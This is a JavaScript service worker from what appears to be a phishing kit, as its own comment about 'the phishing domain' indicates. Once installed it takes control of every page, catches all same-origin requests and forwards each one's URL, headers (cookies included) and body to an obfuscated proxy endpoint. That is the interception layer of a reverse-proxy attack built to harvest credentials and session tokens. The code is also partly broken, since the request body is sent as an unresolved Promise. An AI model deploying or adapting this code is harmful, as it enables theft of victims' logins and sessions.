// service_worker_Mz8XO2ny1Pg5.js
const PROXY_ENDPOINT = '/lNv1pC9AWPUY4gbidyBO';
const INTERNAL_PATHS = [
    PROXY_ENDPOINT,
    '/Mutation_o5y3f4O7jMGW',
    '/JSCookie_6X7dRqLg90mH',
    '/@',
    '/service_worker_Mz8XO2ny1Pg5.js'
];

self.addEventListener('install', event => {
    self.skipWaiting();
    event.waitUntil(Promise.resolve());
});

self.addEventListener('activate', event => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', event => {
    const request = event.request;
    const url = new URL(request.url);

    // Only intercept same-origin requests (relative to the phishing domain)
    if (url.origin !== self.location.origin) return;

    // Skip internal proxy paths
    if (INTERNAL_PATHS.includes(url.pathname)) return;

    // Build the proxy request
    const proxyRequest = new Request(PROXY_ENDPOINT, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: request.method !== 'GET' && request.method !== 'HEAD' ? request.text() : undefined,
            mode: request.mode === 'navigate' ? 'navigate' : 'cors',
            referrer: request.referrer
        })
    });

    event.respondWith(fetch(proxyRequest).then(response => {
        // If the proxy returns a redirect, follow it
        if (response.status >= 300 && response.status < 400 && response.headers.get('location')) {
            return fetch(response.headers.get('location'));
        }
        return response;
    }));
});
